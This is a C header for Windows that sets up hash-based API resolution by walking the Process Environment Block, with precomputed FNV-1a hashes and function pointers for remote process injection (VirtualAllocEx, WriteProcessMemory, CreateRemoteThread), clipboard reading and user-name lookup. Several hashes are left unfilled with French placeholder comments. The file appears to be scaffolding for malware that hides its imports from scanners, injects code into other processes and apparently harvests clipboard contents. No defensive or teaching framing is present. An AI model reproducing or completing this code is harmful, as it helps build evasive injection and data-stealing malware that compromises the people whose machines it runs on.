#ifndef PEB_LOOKUP_H
#define PEB_LOOKUP_H

#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <stdbool.h>

// macro to store data into the .text section
#define DOT_TEXT __attribute__((section(".text")))

/* ============================================================================
 * NT Structures for PEB Walking
 * ========================================================================= */

typedef struct _MY_PEB_LDR_DATA {
    BYTE       Reserved1[8];
    PVOID      Reserved2;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} MY_PEB_LDR_DATA, *PMY_PEB_LDR_DATA;

typedef struct _MY_LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY     InLoadOrderLinks;
    LIST_ENTRY     InMemoryOrderLinks;
    LIST_ENTRY     InInitializationOrderLinks;
    PVOID          DllBase;
    PVOID          EntryPoint;
    ULONG          SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} MY_LDR_DATA_TABLE_ENTRY, *PMY_LDR_DATA_TABLE_ENTRY;

/* ============================================================================
 * FNV-1a Hash Constants (32-bit)
 * ========================================================================= */

#define FNV1A_OFFSET_BASIS  2166136261U
#define FNV1A_PRIME         16777619U

/* ============================================================================
 * Pre-calculated Module Hashes
 * ========================================================================= */

#define HASH_KERNEL32_DLL   0x29CDD463U
#define HASH_USER32_DLL     0x00000000U // À REMPLIR
#define HASH_ADVAPI32_DLL   0x00000000U // À REMPLIR

/* ============================================================================
 * Pre-calculated Function Hashes
 * ========================================================================= */

/* KERNEL32 */
#define HASH_OpenProcess                0x4105FC56U
#define HASH_VirtualAllocEx             0xAEB6049CU
#define HASH_VirtualProtect             0x820621f3U
#define HASH_WriteProcessMemory         0xC0088EEAU
#define HASH_CreateRemoteThread         0xC398C463U
#define HASH_VirtualFreeEx              0xE93E8317U
#define HASH_CloseHandle                0xFABA0065U
#define HASH_CreateToolhelp32Snapshot   0x185776B5U
#define HASH_Process32First             0x0A4C8C8FU
#define HASH_Process32Next              0x15EEC872U
#define HASH_GetLastError               0x5056DF37U
#define HASH_FormatMessageA             0x3F75A588U
#define HASH_GetStdHandle               0xe3b9876aU
#define HASH_WriteFile                  0x7f07c44aU
#define HASH_Sleep                      0x00000000U // À REMPLIR
#define HASH_WaitForSingleObject        0x00000000U // À REMPLIR
#define HASH_DisableThreadLibraryCalls  0x00000000U // À REMPLIR

/* USER32 */
#define HASH_GetClipboardSequenceNumber 0x00000000U // À REMPLIR
#define HASH_OpenClipboard              0x00000000U // À REMPLIR
#define HASH_GetClipboardData           0x00000000U // À REMPLIR
#define HASH_CloseClipboard             0x00000000U // À REMPLIR
#define HASH_GlobalLock                 0x00000000U // À REMPLIR
#define HASH_GlobalUnlock               0x00000000U // À REMPLIR

/* ADVAPI32 */
#define HASH_GetUserNameA               0x00000000U // À REMPLIR

/* ============================================================================
 * Hash Functions
 * ========================================================================= */

DWORD HashStringFNV1a(const char* str);
DWORD HashStringFNV1aW(const wchar_t* str);

/* ============================================================================
 * PEB-based Resolution Functions
 * ========================================================================= */

HMODULE GetModuleBase_Hashed(DWORD moduleHash);
FARPROC GetExportAddress_Hashed(HMODULE hMod, DWORD functionHash);

/* ============================================================================
 * Function Pointer Typedefs
 * ========================================================================= */

/* KERNEL32 */
typedef HANDLE (WINAPI *fnOpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
typedef LPVOID (WINAPI *fnVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL   (WINAPI *fnVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);
typedef BOOL   (WINAPI *fnWriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten);
typedef HANDLE (WINAPI *fnCreateRemoteThread)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
typedef BOOL   (WINAPI *fnVirtualFreeEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
typedef BOOL   (WINAPI *fnCloseHandle)(HANDLE hObject);
typedef HANDLE (WINAPI *fnCreateToolhelp32Snapshot)(DWORD dwFlags, DWORD th32ProcessID);
typedef BOOL   (WINAPI *fnProcess32First)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
typedef BOOL   (WINAPI *fnProcess32Next)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
typedef DWORD  (WINAPI *fnGetLastError)(void);
typedef DWORD  (WINAPI *fnFormatMessageA)(DWORD dwFlags, LPCVOID lpSource, DWORD dwMessageId, DWORD dwLanguageId, LPSTR lpBuffer, DWORD nSize, va_list* Arguments);
typedef HANDLE (WINAPI *fnGetStdHandle)(DWORD nStdHandle);
typedef BOOL   (WINAPI *fnWriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
typedef VOID   (WINAPI *fnSleep)(DWORD dwMilliseconds);
typedef DWORD  (WINAPI *fnWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
typedef BOOL   (WINAPI *fnDisableThreadLibraryCalls)(HMODULE hLibModule);

/* USER32 */
typedef DWORD  (WINAPI *fnGetClipboardSequenceNumber)(void);
typedef BOOL   (WINAPI *fnOpenClipboard)(HWND hWndNewOwner);
typedef HANDLE (WINAPI *fnGetClipboardData)(UINT uFormat);
typedef BOOL   (WINAPI *fnCloseClipboard)(void);
typedef LPVOID (WINAPI *fnGlobalLock)(HGLOBAL hMem);
typedef BOOL   (WINAPI *fnGlobalUnlock)(HGLOBAL hMem);

/* ADVAPI32 */
typedef BOOL   (WINAPI *fnGetUserNameA)(LPSTR lpBuffer, LPDWORD pcbBuffer);

/* ============================================================================
 * DYNAMIC_APIS Structure
 * ========================================================================= */

typedef struct _DYNAMIC_APIS {
    /* KERNEL32 */
    fnOpenProcess               pOpenProcess;
    fnVirtualAllocEx            pVirtualAllocEx;
    fnVirtualProtect            pVirtualProtect;
    fnWriteProcessMemory        pWriteProcessMemory;
    fnCreateRemoteThread        pCreateRemoteThread;
    fnVirtualFreeEx             pVirtualFreeEx;
    fnCloseHandle               pCloseHandle;
    fnGetStdHandle              pGetStdHandle;
    fnWriteFile                 pWriteFile;
    fnCreateToolhelp32Snapshot  pCreateToolhelp32Snapshot;
    fnProcess32First            pProcess32First;
    fnProcess32Next             pProcess32Next;
    fnGetLastError              pGetLastError;
    fnFormatMessageA            pFormatMessageA;
    fnSleep                     pSleep;
    fnWaitForSingleObject       pWaitForSingleObject;
    fnDisableThreadLibraryCalls pDisableThreadLibraryCalls;

    /* USER32 */
    fnGetClipboardSequenceNumber pGetClipboardSequenceNumber;
    fnOpenClipboard              pOpenClipboard;
    fnGetClipboardData           pGetClipboardData;
    fnCloseClipboard             pCloseClipboard;
    fnGlobalLock                 pGlobalLock;
    fnGlobalUnlock               pGlobalUnlock;

    /* ADVAPI32 */
    fnGetUserNameA               pGetUserNameA;
} DYNAMIC_APIS, *PDYNAMIC_APIS;

DOT_TEXT extern DYNAMIC_APIS g_Api;

DYNAMIC_APIS * InitDynamicAPIs(void);
DYNAMIC_APIS * getAPI(void);

#endif /* PEB_LOOKUP_H */
